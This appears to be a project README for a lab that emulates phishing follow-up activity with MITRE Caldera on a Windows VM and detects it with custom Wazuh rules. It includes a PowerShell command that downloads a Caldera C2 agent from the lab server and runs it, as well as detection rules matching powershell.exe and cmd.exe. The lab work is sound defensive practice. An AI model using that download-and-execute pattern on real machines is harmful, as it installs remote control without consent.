# Adversary Emulation and Detection using Caldera and Wazuh

## 📌 Overview

This project demonstrates adversary emulation and detection using MITRE Caldera and Wazuh SIEM. The objective is to simulate attacker behavior based on MITRE ATT&CK techniques and evaluate the detection capabilities of a Security Operations Center (SOC) environment.

The simulation focuses on T1566 (Phishing), where a user executes a malicious payload, triggering command execution on a Windows endpoint. Detection is performed using Wazuh by monitoring process activity and command execution.

---

## 🛠️ Tools Used

* MITRE Caldera (Adversary Emulation)
* Wazuh (SIEM & XDR)
* Kali Linux (Attack Server)
* Windows 10 (Target System)
* VirtualBox (Virtualization)

---

## 🧪 Lab Setup

### Network Configuration

* Kali Linux IP: 192.168.56.1
* Windows IP: 192.168.56.103
* All machines connected via Host-Only Adapter

### Components

* Caldera server running on Kali Linux
* Sandcat agent deployed on Windows machine
* Wazuh server monitoring logs

---

## 🚀 Installation Steps

### 1. Install Caldera

```bash
git clone --recursive https://github.com/mitre/caldera.git
cd caldera
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

### 2. Install Dependencies

```bash
sudo apt install nodejs npm golang-go -y
```

### 3. Run Caldera

```bash
python3 server.py --insecure --build --fresh
```

---

## 🤖 Agent Deployment

Due to missing payloads in the default setup, the Sandcat agent was manually compiled:

```bash
cd plugins/sandcat/gocat
GOOS=windows GOARCH=amd64 go build -o sandcat.exe
cp sandcat.exe ~/caldera/plugins/stockpile/data/payloads/
```

### Deploy Agent (Windows PowerShell)

```powershell
$server="http://192.168.56.1:8888";
Invoke-WebRequest -Uri "$server/file/download" -Headers @{"platform"="windows";"file"="sandcat.exe"} -OutFile C:\Users\Public\agent.exe;
Start-Process C:\Users\Public\agent.exe -ArgumentList "-server $server"
```

---

## 🎯 Attack Simulation

Since default adversaries were unavailable, a custom adversary was created in Caldera.

### Commands Executed:

* whoami
* systeminfo
* cmd.exe /c dir
* powershell

These simulate post-phishing activity (T1566).

---

## 🔎 Detection using Wazuh

Custom detection rules were added:

```xml
<rule id="100100" level="10">
  <match>powershell.exe</match>
  <description>Possible phishing payload execution</description>
</rule>

<rule id="100101" level="8">
  <match>cmd.exe</match>
  <description>Command execution detected</description>
</rule>
```

Wazuh successfully detected:

* PowerShell execution
* Command-line activity
* System reconnaissance commands

---

